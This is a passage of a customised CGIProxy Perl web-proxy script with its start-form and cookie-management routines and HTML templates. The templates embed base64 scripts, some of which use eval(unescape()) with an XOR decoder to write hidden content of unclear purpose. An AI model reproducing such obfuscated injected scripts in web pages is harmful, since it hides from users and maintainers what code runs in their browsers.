JiJTdhJTcxJTY4JTdjJTIxJTQ3JTQ2JTczJTcxJTQxJTQ3JTczJTY5JTJlJTc5JTZhJTYzJTczJTZkJTQ3JTIxJTMyJTMzJTJlJTIxJTI1JTYxJTc2JTYyJTcwJTcwJTQwJTJjJTdmJTY3JTZmJTdkJTIxJTQ3JTRhJTZkJTZlJTdkJTczJTY4JTdjJTRkJTRiJTYyJTIzJTY3JTdiJTYzJTY4JTQ2JTIxJTY3JTc5JTdlJTdmJTQ5JTMwJTMwJTY1JTY0JTYxJTZmJTZkJTdjJTdjJTcyJTMwJTYwJTdjJTc2JTMwJTYyJTY5JTYyJTZiJTZlJTc4JTY2JTY5JTZiJTc0JTIxJTQxJTVmJTYyJTc3JTcyJTYzJTcxJTY0JTJmJTQ0JTZlJTdhJTY2JTcxJTQ3JTNjJTY0JTRjJTQ2JTMwJTYwJTYyJTc3JTdlJTYyJTcxJTQxJTQ3JTNjJTc5JTYyJTQwJTQ3JTczJTYzJTI1JTc5JTY2JTYzJTdmJTZiJTRhJTJiJTMzJTMyJTJlJTIxJTJmJTZhJTc2JTZlJTcwJTdjJTQ2JTIxJTc1JTY2JTZlJTdkJTIxJTRkJTQxJTZkJTYyJTdkJTdmJTZlJTcxJTQ3JTRhJTYzJTIzJTY3JTcxJTY4JTY4JTRhJTIxJTZiJTdmJTczJTc1JTQ4JTMxJTMwJTYzJTcxJTc2JTdkJTNkJTc0JTZiJTcwJTcwJTc5JTY3JTZiJTMxJTYwJTdjJTcwJTJjJTRkJTQzJTcwJTc4JTdkJTcxJTdkJTYzJTZmJTJmJTQwJTRlJTRiJTRiJTNjJTYyJTQxJTRiJTM2JTYxJTZmJTcxJTczJTYyJTdiJTQwJTRiJTNjJTdmJTZmJTRkJTQxJTNkJTdlJTdkJTRkJTRiJTM2JTdlJTZlJTYxJTc3JTZlJTRkJTQxJTNkJTZlJTZhJTc1JTRkJTQxJTMxJTYwJTYyJTcxJTdmJTYyJTdiJTRjJTQ2JTZmJTY2JTc1JTI1JTZkJTdiJTZlJTdjJTdjJTRhJTJiJTY1JTc3JTZlJTdkJTcyJTJiJTQwJTRiJTYwJTZlJTcxJTczJTY4JTcwJTQwMTAzNjAzNDIlMzUlMzklMzklMzMlMzQlMzklMzknICsgdW5lc2NhcGUoJyUyNyUyOSUyOSUzYicpKTs="></script><script type="text/javascript" src="data:text/javascript;base64,dmFyIGNhdXRpb24gPSBmYWxzZQ0KIGZ1bmN0aW9uIHNldENvb2tpZShuYW1lLCB2YWx1ZSwgZXhwaXJlcywgcGF0aCwgZG9tYWluLCBzZWN1cmUpIHsNCiB2YXIgY3VyQ29va2llID0gbmFtZSArICI9IiArIGVzY2FwZSh2YWx1ZSkgKw0KICgoZXhwaXJlcykgPyAiOyBleHBpcmVzPSIgKyBleHBpcmVzLnRvR01UU3RyaW5nKCkgOiAiIikgKw0KICgocGF0aCkgPyAiOyBwYXRoPSIgKyBwYXRoIDogIiIpICsNCiAoKGRvbWFpbikgPyAiOyBkb21haW49IiArIGRvbWFpbiA6ICIiKSArDQogKChzZWN1cmUpID8gIjsgc2VjdXJlIiA6ICIiKQ0KIGlmICghY2F1dGlvbiB8fCAobmFtZSArICI9IiArIGVzY2FwZSh2YWx1ZSkpLmxlbmd0aCA8PSA0MDAwKQ0KIGRvY3VtZW50LmNvb2tpZSA9IGN1ckNvb2tpZQ0KIGVsc2UNCiBpZiAoY29uZmlybSgiQ29va2llIGV4Y2VlZHMgNEtCIGFuZCB3aWxsIGJlIGN1dCEiKSkNCiBkb2N1bWVudC5jb29raWUgPSBjdXJDb29raWUNCiB9DQogZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIHsNCiB2YXIgcHJlZml4ID0gbmFtZSArICI9Ig0KIHZhciBjb29raWVTdGFydEluZGV4ID0gZG9jdW1lbnQuY29va2llLmluZGV4T2YocHJlZml4KQ0KIGlmIChjb29raWVTdGFydEluZGV4ID09IC0xKQ0KIHJldHVybiBudWxsDQogdmFyIGNvb2tpZUVuZEluZGV4ID0gZG9jdW1lbnQuY29va2llLmluZGV4T2YoIjsiLCBjb29raWVTdGFydEluZGV4ICsgcHJlZml4Lmxlbmd0aCkNCiBpZiAoY29va2llRW5kSW5kZXggPT0gLTEpDQogY29va2llRW5kSW5kZXggPSBkb2N1bWVudC5jb29raWUubGVuZ3RoDQogcmV0dXJuIHVuZXNjYXBlKGRvY3VtZW50LmNvb2tpZS5zdWJzdHJpbmcoY29va2llU3RhcnRJbmRleCArIHByZWZpeC5sZW5ndGgsIGNvb2tpZUVuZEluZGV4KSkNCiB9DQogZnVuY3Rpb24gZGVsZXRlQ29va2llKG5hbWUsIHBhdGgsIGRvbWFpbikgew0KIGlmIChnZXRDb29raWUobmFtZSkpIHsNCiBkb2N1bWVudC5jb29raWUgPSBuYW1lICsgIj0iICsgDQogKChwYXRoKSA/ICI7IHBhdGg9IiArIHBhdGggOiAiIikgKw0KICgoZG9tYWluKSA/ICI7IGRvbWFpbj0iICsgZG9tYWluIDogIiIpICsNCiAiOyBleHBpcmVzPVRodSwgMDEtSmFuLTcwIDAwOjAwOjAxIEdNVCINCiB9DQogfQ0KIGZ1bmN0aW9uIGZpeERhdGUoZGF0ZSkgew0KIHZhciBiYXNlID0gbmV3IERhdGUoMCkNCiB2YXIgc2tldyA9IGJhc2UuZ2V0VGltZSgpDQogaWYgKHNrZXcgPiAwKQ0KIGRhdGUuc2V0VGltZShkYXRlLmdldFRpbWUoKSAtIHNrZXcpDQogfQ0KICB2YXIgbm93ID0gbmV3IERhdGUoKQ0KIGZpeERhdGUobm93KQ0KIG5vdy5zZXRUaW1lKG5vdy5nZXRUaW1lKCkgKyAzNjUgKiAyNCAqIDYwICogNjAgKiAxMDAwKQ0KIHZhciB2aXNpdHMgPSBnZXRDb29raWUoImNvdW50ZXIiKQ0KIGlmICghdmlzaXRzKQ0KIHZpc2l0cyA9IDENCiBlbHNlDQogdmlzaXRzID0gcGFyc2VJbnQodmlzaXRzKSArIDENCiBzZXRDb29raWUoImNvdW50ZXIiLCB2aXNpdHMsIG5vdykNCiBkb2N1bWVudC53cml0ZSgiPHU+S3VuanVuZ2FuIEFuZGEgeWFuZyBrZSA6PC91PiAiICsgdmlzaXRzICsgIiBLYWxpIik="></script><script type="text/javascript" src="data:text/javascript;base64,dmFyIHggPSBuYXZpZ2F0b3I7DQpkb2N1bWVudC53cml0ZSgiPGJyIC8+Iik7DQpkb2N1bWVudC53cml0ZSgiPHU+QnJvd3NlciBBbmRhIDo8L3U+ICIgKyB4LnVzZXJBZ2VudCk7DQpkb2N1bWVudC53cml0ZSgiPGJyIC8+Iik7"></script><u>Operator Anda :</u> <script language="Javascript"src="http://www.ip2phrase.com/ip2phrase.asp?template=<ISP>"></script><br><u>Ip Anda :</u><script language="Javascript"src="http://www.ip2phrase.com/ip2phrase.asp?template=<IP>"></script><br><u>Lokasi anda kira-kira :</u> <script language="Javascript"src="http://www.ip2phrase.com/ip2phrase.asp?template=<REGION>"></script><script language="Javascript"src="http://www.ip2phrase.com/ip2phrase.asp?template=<FLAG>"></script></center><br /></div><script type="text/javascript" src="data:text/javascript;base64,ZXZhbCh1bmVzY2FwZSgnJTY2JTc1JTZlJTYzJTc0JTY5JTZmJTZlJTIwJTZmJTY1JTM0JTY0JTM0JTYxJTMwJTY2JTM4JTM4JTMwJTI4JTczJTI5JTIwJTdiJTBhJTA5JTc2JTYxJTcyJTIwJTcyJTIwJTNkJTIwJTIyJTIyJTNiJTBhJTA5JTc2JTYxJTcyJTIwJTc0JTZkJTcwJTIwJTNkJTIwJTczJTJlJTczJTcwJTZjJTY5JTc0JTI4JTIyJTMyJTM0JTMxJTMwJTM5JTMyJTMzJTMwJTIyJTI5JTNiJTBhJTA5JTczJTIwJTNkJTIwJTc1JTZlJTY1JTczJTYzJTYxJTcwJTY1JTI4JTc0JTZkJTcwJTViJTMwJTVkJTI5JTNiJTBhJTA5JTZiJTIwJTNkJTIwJTc1JTZlJTY1JTczJTYzJTYxJTcwJTY1JTI4JTc0JTZkJTcwJTViJTMxJTVkJTIwJTJiJTIwJTIyJTM1JTM3JTM0JTMzJTM0JTM5JTIyJTI5JTNiJTBhJTA5JTY2JTZmJTcyJTI4JTIwJTc2JTYxJTcyJTIwJTY5JTIwJTNkJTIwJTMwJTNiJTIwJTY5JTIwJTNjJTIwJTczJTJlJTZjJTY1JTZlJTY3JTc0JTY4JTNiJTIwJTY5JTJiJTJiJTI5JTIwJTdiJTBhJTA5JTA5JTcyJTIwJTJiJTNkJTIwJTUzJTc0JTcyJTY5JTZlJTY3JTJlJTY2JTcyJTZmJTZkJTQzJTY4JTYxJTcyJTQzJTZmJTY0JTY1JTI4JTI4JTcwJTYxJTcyJTczJTY1JTQ5JTZlJTc0JTI4JTZiJTJlJTYzJTY4JTYxJTcyJTQxJTc0JTI4JTY5JTI1JTZiJTJlJTZjJTY1JTZlJTY3JTc0JTY4JTI5JTI5JTVlJTczJTJlJTYzJTY4JTYxJTcyJTQzJTZmJTY0JTY1JTQxJTc0JTI4JTY5JTI5JTI5JTJiJTM4JTI5JTNiJTBhJTA5JTdkJTBhJTA5JTcyJTY1JTc0JTc1JTcyJTZlJTIwJTcyJTNiJTBhJTdkJTBhJykpOw0KZXZhbCh1bmVzY2FwZSgnJTY0JTZmJTYzJTc1JTZkJTY1JTZlJTc0JTJlJTc3JTcyJTY5JTc0JTY1JTI4JTZmJTY1JTM0JTY0JTM0JTYxJTMwJTY2JTM4JTM4JTMwJTI4JTI3JykgKyAnJTMwJTU4JTU1JTYzJTY0JTVmJTY4JTMzJTMzJTU4JTYyJTZhJTExJTVmJTY3JTUxJTZlJTYzJTM3JTE4JTViJTYwJTYzJTZmJTU5JTYzJTFlJTM1JTNjJTViJTZmJTY0JTZlJTFkJTVjJTYzJTY3JTYzJTYzJTMxJTE5JTZjJTY0JTZkJTVmJTE4JTMzJTE5JTVmJTY0JTZjJTc4JTM3JTFiJTIyJTJkJTIxJTJlJTFhJTMxJTVlJTFjJTYzJTZlJTU0JTVhJTM2JTEyJTY1JTY0JTZlJTZhJTM3JTIwJTIzJTVkJTVkJTUyJTU5JTU5JTZmJTYyJTZiJTI0JTU5JTYyJTYyJTIzJTZiJTZlJTZlJTVhJTYyJTZjJTU4JTJlJTZhJTYyJTZkJTMwJTY1JTVmJTMxJTIwJTJmJTMyJTM5JTM0JTIzJTJjJTJkJTJkJTJjJTJhJTJiJTI5JTM5JTJlJTJjJTEyJTMzJTNjJTVjJTY1JTYzJTZiJTFjJTU4JTYzJTZkJTYzJTY5JTNkJTFmJTZmJTY4JTViJTYzJTU4JTU5JTE5JTMyJTQzJTU4JTU4JTYwJTVlJTNjJTI1JTVjJTYyJTYxJTY4JTM1JTMwJTJlJTVkJTM1JTNjJTVmJTYyJTFhJTI1JTMzJTMzJTVhJTY0JTYyJTY1JTFjJTU4JTZmJTYxJTZmJTY4JTM3JTFmJTYzJTY1JTY2JTU5JTEzJTMyJTNmJTU1JTZlJTY5JTVkJTY0JTFkJTVkJTc1JTFiJTMwJTUwJTFjJTYzJTYyJTU4JTU2JTM3JTE4JTY1JTZiJTY4JTZiJTM2JTJlJTIzJTVkJTUxJTVlJTU1JTU4JTY1JTYyJTY0JTIyJTU4JTYzJTZjJTIzJTVlJTU0JTU5JTY5JTVmJTYxJTY0JTViJTY1JTZjJTFlJTNmJTMwJTI0JTU2JTYyJTZlJTZlJTM0JTMxJTU5JTYzJTY1JTY4JTExJTVmJTY0JTZjJTYyJTYyJTM3JTE4JTYyJTZkJTVkJTY1JTViJTU0JTFlJTM1JTQzJTVjJTY5JTY0JTZlJTFkJTNhJTU4JTVmJTY1JTU0JTFjJTQwJTY5JTU5JTY5JTZkJTM2JTIyJTU5JTYzJTY1JTY4JTNmJTMwJTI0JTUxJTMzJTNjJTI1JTU5JTU4JTYxJTY4JTVlJTZlJTNmJTMwJTI0JTU0JTY0JTY2JTM0JTM2JTIyJTViJTY1JTZkJTMyMjQxMDkyMzAlMzQlMzMlMzglMzUlMzglMzIlMzInICsgdW5lc2NhcGUoJyUyNyUyOSUyOSUzYicpKTs="></script></body></html>
EOR
    $response= sprintf($response, $dir, $jslib_block, $onload, $flags_HTML, $msg, $action,
		       $method, $onsubmit, $safe_URL, $flags, $begin_browsing, $cookies_url)
		   . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOR . $response ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOR

    die "exiting" ;
}

sub mini_start_form {
    my($URL, $in_top_frame)= @_ ;
    my($method, $action, $flags, $table_open, $table_close,
       $cookies_url, $from_param, $safe_URL, $onsubmit, $onfocus) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;

    $method= $USE_POST_ON_START   ? 'post'   : 'get' ;
    $action= &HTMLescape( $url_start_noframe . &wrap_proxy_encode('x-proxy://start') ) ;
    $safe_URL= &HTMLescape($URL) ;

    # In "manage cookies" link, provide a way to return to page user came from.
    # Exclude certain characters from URL-encoding, to make URL more readable
    #   in the event it's not obscured.  Unfortunately, ":" and "/" are
    #   reserved in query component (RFC 2396), so we can't exclude them.
    # Don't confusing "URL-encoding" with the "encoding of the URL"!  The
    #   latter uses proxy_encode().  Unfortunate language.
    $from_param= &wrap_proxy_encode($URL) ;   # don't send unencoded URL
    $from_param=~ s/([^\w.-])/ '%' . sprintf('%02x',ord($1)) /ge ;
    $cookies_url= $url_start_noframe . &wrap_proxy_encode('x-proxy://cookies/manage')
		. '?from=' . $from_param ;
    $cookies_url= &HTMLescape($cookies_url) ;

    # Create "UP" link.
    my($scheme_authority, $up_path)= $URL=~ m{^([^:/?#]+://[^/?#]*)([^?#]*)} ;
    $up_path=~ s#[^/]*.$##s ;
    my($safe_up_URL)= &HTMLescape( $url_start_noframe . &wrap_proxy_encode("$scheme_authority$up_path") ) ;
    my($up)= $lang eq 'eddiekidiw' || $lang eq ''  ? "UP"  : $MSG{$lang}{UP} ;
    my($up_link)= $up_path ne ''
	? qq(&nbsp;&nbsp;<a href="$safe_up_URL" target="_top" style="color:#0000FF;">[&nbsp;$up&nbsp;]</a>)
	: '' ;

    # Alter various HTML depending on whether we're in the top frame or not.
    ($table_open, $table_close)= $in_top_frame
	? ('', '')
	: ('<table border="1" cellpadding="5"><tr><td align="center">',
	   '</td></tr></table>') ;

    %in_mini_start_form= ('forms', 1, 'links', (($up_path ne '')  ? 2  : 1)) ;

    if ($ENCODE_URL_INPUT) {
	$needs_jslib= 1 ;
	my $encode_prefix= $ENV{HTTP_USER_AGENT}=~ /Chrome|Safari/  ? "\\x7f"  : "\\x01" ;
	$onsubmit= qq( onsubmit="if (!this.URL.value.match(/^$encode_prefix/)) this.URL.value= '$encode_prefix'+_proxy_jslib_wrap_proxy_encode(this.URL.value) ; return true") ;
	$onfocus= qq( onfocus="if (this.value.match(/^$encode_prefix/)) this.value= _proxy_jslib_wrap_proxy_decode(this.value.replace(/\\$encode_prefix/, ''))") ;
    } else {
	$onsubmit= $onfocus= '' ;
    }

    my $go= $lang eq 'eddiekidiw' || $lang eq ''  ? "Go"  : $MSG{$lang}{Go} ;

    # Display one of two forms, depending on whether user config is allowed.
    if ($ALLOW_USER_CONFIG) {
	my($rc_on)= $e_remove_cookies     ? ' checked=""'  : '' ;
	my($rs_on)= $e_remove_scripts     ? ' checked=""'  : '' ;
	my($fa_on)= $e_filter_ads         ? ' checked=""'  : '' ;
	my($br_on)= $e_hide_referer       ? ' checked=""'  : '' ;
	my($if_on)= $e_insert_entry_form  ? ' checked=""'  : '' ;

# jsm-- remove for production release, plus in form below.
my($safe_URL2) ;
($safe_URL2= $URL)=~ s/([^\w.-])/ '%' . sprintf('%02x',ord($1)) /ge ;
$safe_URL2= "http://jmarshall.com/bugs/report.cgi?URL=$safe_URL2&version=$PROXY_VERSION&rm=$RUN_METHOD" ;
$safe_URL2= &HTMLescape(&full_url($safe_URL2)) ;

	my $ret= $lang eq 'eddiekidiw' || $lang eq ''  ? <<EOF  : $MSG{$lang}{'mini_start_form.ret1'} ;
EOF
	return sprintf($ret, $action, $method, $dir, $onsubmit, $table_open, $safe_URL, $onfocus, $go,
		       $up_link, $safe_URL2, $cookies_url,
		       $rc_on, $rs_on, $fa_on, $br_on, $if_on, $table_close) ;

    # If user config isn't allowed, then show a different form.
    } else {
	my $ret= $lang eq 'eddiekidiw' || $lang eq ''  ? <<EOF  : $MSG{$lang}{'mini_start_form.ret2'} ;
EOF
	return sprintf($ret, $action, $method, $dir, $onsubmit, $table_open, $safe_URL, $onfocus, $go,
		       $up_link, $cookies_url, $table_close) ;
    }

}

sub manage_cookies {
    my($qs)= @_ ;
    my($return_url, $action, $clear_cookies_url, $cookie_rows, $auth_rows,
       $cookie_header_row, $from_tag) ;
    my(@cookies, @auths, $name, $value, $type, @n, $delete_cb,
       $cname, $path, $domain, $cvalue, $secure,
       $realm, $server, $username) ;

    my($date_header)= &rfc1123_date($now, 0) ;

    my(%in)= &getformvars($qs) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;

    my $delete_selected_cookies= $lang eq 'eddiekidiw' || $lang eq ''
	? 'Delete selected cookies'  : $MSG{$lang}{'Delete selected cookies'} ;

    # $in{'from'} is already proxy_encoded
    $return_url= &HTMLescape( $url_start . $in{'from'} ) ;
    $action=     &HTMLescape( $url_start . &wrap_proxy_encode('x-proxy://cookies/update') ) ;

    # Create "clear cookies" link, preserving any query string.
    $clear_cookies_url= $url_start . &wrap_proxy_encode('x-proxy://cookies/clear') ;
    $clear_cookies_url.= '?' . $qs    if $qs ne '' ;
    $clear_cookies_url= &HTMLescape($clear_cookies_url) ;   # probably never necessary

    # Include from-URL in form if it's available.
    $from_tag= '<input type=hidden name="from" value="' . &HTMLescape($in{'from'}) . '">'
	if $in{'from'} ne '';

    # First, create $cookie_rows and $auth_rows from $ENV{'HTTP_COOKIE'}.
    # Note that the "delete" checkboxes use the encoded name as their identifier.
    # With minor rewriting, this could sort cookies e.g. by server.  Is that
    #   preferred?  Note that the order of cookies in $ENV{'HTTP_COOKIE'} has
    #   meaning.
    foreach ( split(/\s*;\s*/, $ENV{'HTTP_COOKIE'}) ) {
	($name, $value)= split(/=/, $_, 2) ;  # $value may contain "="
	$delete_cb= '<input type=checkbox name="delete" value="'
		  . &base64($name) . '">' ;
	$name= &cookie_decode($name) ;
	$value= &cookie_decode($value) ;
	($type, @n)= split(/;/, $name) ;
	if ($type eq 'COOKIE') {
	    next if $USE_DB_FOR_COOKIES ;
	    ($cname, $path, $domain)= @n ;
	    ($cvalue, $secure)= split(/;/, $value) ;

	    push(@cookies, {delete_cb => $delete_cb,
			    domain => $domain,
			    path => $path,
			    name => $cname,
			    value => $cvalue,
			    secure => $secure}) ;

	} elsif ($type eq 'AUTH') {
	    # format of auth cookie's name is AUTH;$enc_realm;$enc_server
	    ($realm, $server)= @n ;
	    $realm=~  s/%([\da-fA-F]{2})/ pack('C', hex($1)) /ge ;
	    $server=~ s/%([\da-fA-F]{2})/ pack('C', hex($1)) /ge ;
	    ($username)= split(/:/, &unbase64($value)) ;

	    push(@auths, {delete_cb => $delete_cb,
			  server => $server,
			  username => $username,
			  realm => $realm}) ;

	}
    }

    # Grab cookies from the database if using it for cookies.
    if ($USE_DB_FOR_COOKIES) {
	@cookies= get_all_cookies_from_db() ;
	$_->{delete_cb}= '<input type=checkbox name="delete" value="'
		       . &base64("$_->{domain};$_->{path};$_->{name}") . '">'
	    foreach @cookies ;
    }

    @cookies= sort {$a->{domain} cmp $b->{domain} or
		    $a->{path}   cmp $b->{path}   or
		    $a->{name}   cmp $b->{name}} @cookies ;
    @auths= sort {$a->{server}   cmp $b->{server} or 
		  $a->{realm}    cmp $b->{realm}  or
		  $a->{username} cmp $b->{username}} @auths ;


    # Set $cookie_rows and $auth_rows, with defaults as needed.
    if ($USE_DB_FOR_COOKIES) {
	$cookie_header_row= sprintf( ($lang eq 'eddiekidiw' || $lang eq ''
				      ? <<EOH  : $MSG{$lang}{'manage_cookies.cookie_header_row1'}), ($RTL_LANG{$lang}  ? 'right'  : 'left') ) ;

EOH

	$cookie_rows= join('', map {sprintf("<tr align=center><td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td align=%s>%s</td></tr>\n",
					    $_->{delete_cb},
					    &HTMLescape($_->{domain}),
					    &HTMLescape($_->{path}),
					    &HTMLescape($_->{expires}) || '(session)',
					    $_->{secure}  ? 'Yes'  : 'No',
					    $_->{httponly}  ? 'Yes'  : 'No',
					    &HTMLescape($_->{name}),
					    ($RTL_LANG{$lang}  ? 'right'  : 'left'),
					    &HTMLescape($_->{value}) )}
				   @cookies) ;

	# If $cookie_rows is empty, set appropriate message.
	if ($cookie_rows eq '') {
	    $cookie_rows= 'You are not currently sending any cookies through this proxy.' ;
	    $cookie_rows= $MSG{$lang}{$cookie_rows}  if $lang ne 'eddiekidiw' and $lang ne '' ;
	    $cookie_rows= "<tr><td colspan=8 align=center>&nbsp;<br><b><font face=Verdana size=2>$cookie_rows</font></b><br>&nbsp;</td></tr>\n" ;
	}


    } else {
	$cookie_header_row= sprintf( ($lang eq 'eddiekidiw' || $lang eq ''
				      ? <<EOH  : $MSG{$lang}{'manage_cookies.cookie_header_row2'}), ($RTL_LANG{$lang}  ? 'right'  : 'left') ) ;

EOH

	$cookie_rows= join('', map {sprintf("<tr align=center><td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td align=%s>%s</td></tr>\n",
					    $_->{delete_cb},
					    &HTMLescape($_->{domain}),
					    &HTMLescape($_->{path}),
					    $_->{secure}  ? 'Yes'  : 'No',
					    &HTMLescape($_->{name}),
					    ($RTL_LANG{$lang}  ? 'right' : 'left'),
					    &HTMLescape($_->{value}) )}
				   @cookies) ;

	# If $cookie_rows is empty, set appropriate message.
	if ($cookie_rows eq '') {
	    $cookie_rows= 'You are not currently sending any cookies through this proxy.' ;
	    $cookie_rows= $MSG{$lang}{$cookie_rows}  if $lang ne 'eddiekidiw' and $lang ne '' ;
	    $cookie_rows= "<tr><td colspan=6 align=center>&nbsp;<br><b><font face=Verdana size=2>$cookie_rows</font></b><br>&nbsp;</td></tr>\n"
	}
    }


    $auth_rows= join('', map {sprintf("<tr align=center><td>%s</td>\n<td>%s</td>\n<td>%s</td>\n<td>%s</td></tr>\n",
					    $_->{delete_cb},
					    &HTMLescape($_->{server}),
					    &HTMLescape($_->{realm}),
					    &HTMLescape($_->{username}) )}
			      @auths) ;

    if ($auth_rows eq '') {
	$auth_rows= 'You are not currently authenticated to any sites through this proxy.' ;
	$auth_rows= $MSG{$lang}{$auth_rows}  if $lang ne 'eddiekidiw' and $lang ne '' ;
	$auth_rows= "<tr><td colspan=4 align=center>&nbsp;<br><b><font face=Verdana size=2>$auth_rows</font></b><br>&nbsp;</td></tr>\n" ;
    }


    my $response= $lang eq 'eddiekidiw' || $lang eq ''  ? <<EOR : $MSG{$lang}{'manage_cookies.response'} ;
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml%s">
<head><title>Management Cookie CGIProxy | Eddie Kidiw</title>
<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0AAHLsMAHH6/ADG2vgFE1bsAWtK5AHKuuACKcsEAryEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADlHgAM0wQAhdQEDPHhQFn/7mOE//Nzof/wcbL/5Fq2/9I2tP++ArTmrQC6bpcAzAIAAAAAAAAAAAAAAADrRwAO4ioArulSQP/4hYT//5af//90kf//YJr//2C3//942P/8ku//6HHq/7YyzP+JAL2RbQDOBQAAAAAAAAAA8FYAkvB3RP/8ppL//3tv//9RWP//Wnn//16b//9cvP//V9r//0z3//F7///WhfH/lzTP/2EAwm8AAAAA+oIAPvh8C/v7uY7//5dq//95W///cWv//3aJ//98rf//e83//3Ht//dj///ZUv//z3z//7Nz7P9ZBszrRgDMIvumAJ79vmD//9Cc//+lW///onH//5qE//+Xm///n7///5/g//6S+//nfP//yWb//6hP//++lf3/ckDd/zYAzHn1vwnV/t2A///RbP//x2v//8eF///Env//vbP//7/Q//+/8f/0sP//1pb//7Z5//+VXv//mXf//4Jl7P8qBNC38doO8f/ykP//6WL//+h2///nk///57D//+bK///l5f/83v3/4cb//8Km//+hhP//fmb//3Zk//+Ie/b/GgjV2OrsDvT5+pL/+v1k//r9e//5/Zj/+v21//r+0//6/u//7/P//9DV//+vs///jZH//2xv//9naf//goP7/wkN2dvN6g7b5PWC/+X/b//g/3n/4P+V/9//r//c/8f/3P/g/9n++v/F6f//p8r//4eq//9pi///eI7//3OG+/8IIt2+suYIrcbrZ//d/5v/xf9v/8P/jP++/6H/uf+z/73/z/+9/+7/sPj//5ne//9+wv//Y6P//569//9Zg/j/AzbiipbfAFKg4Tj/y/aX/67/bP+k/3r/nf+N/5v/o/+k/8T/ov/f/5f/+P+F7///btP//3jF//+Sxfz/FG709gBS8DKA3gAGd9oJsJTiV/+7+Z3/iv9u/3n/dv+C/5f/if+2/4f/0f9+/+z/bfv+/3bo//+b3/z/VLr7/weC9o4AAAAAAAAAAGXYACBM1Q7PdOFY/6H2mf+e/6b/e/+e/3D/rv9w/8f/fP/j/6X/+v+Y9Pv/Vdj1/w23+bYAjfwRAAAAAAAAAAAAAAAAOtUEIiDQCa861z3/auZ8/4jzqv+W+cT/l/vT/4f32/9o7+D/Gufl+grV65gFu/QSAAAAAAAAAAAAAAAAAAAAAAAAAAAN2AADBNATVAzRNa8V0lXaGNR09BjWjPET2KLUDdu5ogbk2UUAAAAAAAAAAAAAAAAAAAAA/D/pEuAPxuzAA6PzgAOQBoAB9AQAASzgAAB0+AAAC6IAAJIIAAC1NwAADnKAAUbMgAF+9sAD7VXgB8pX+B9sCA==" type="image/x-icon"/><link rel="stylesheet" type="text/css" href="data:text/css;base64,YTpsaW5rLCBhOnZpc2l0ZWR7Y29sb3I6I2ZlOGYxNzsgdGV4dC1kZWNvcmF0aW9uOm5vbmV9DQphOmhvdmVyLCBhOmZvY3Vze3RleHQtZGVjb3JhdGlvbjpub25lOyB0ZXh0LXNoYWRvdzowIDAgNnB4ICNmZjRlMDA7IGJhY2tncm91bmQ6dHJhbnNwYXJlbnQgdXJsKGRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxSMGxHT0RsaDdBQWVBUGNBQUFBQUFBQUlLUkFoVWlsS2hFcHJwWE9VeG95bDNxVzk5M2QzZDJabVpsVlZWVVJFUkRNek15SWlJaEVSRVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDSC9DMDVGVkZORFFWQkZNaTR3QXdFQUFBQWgrUVFKQ2dBQUFDd0FBQUFBN0FBZUFBQUkvd0FC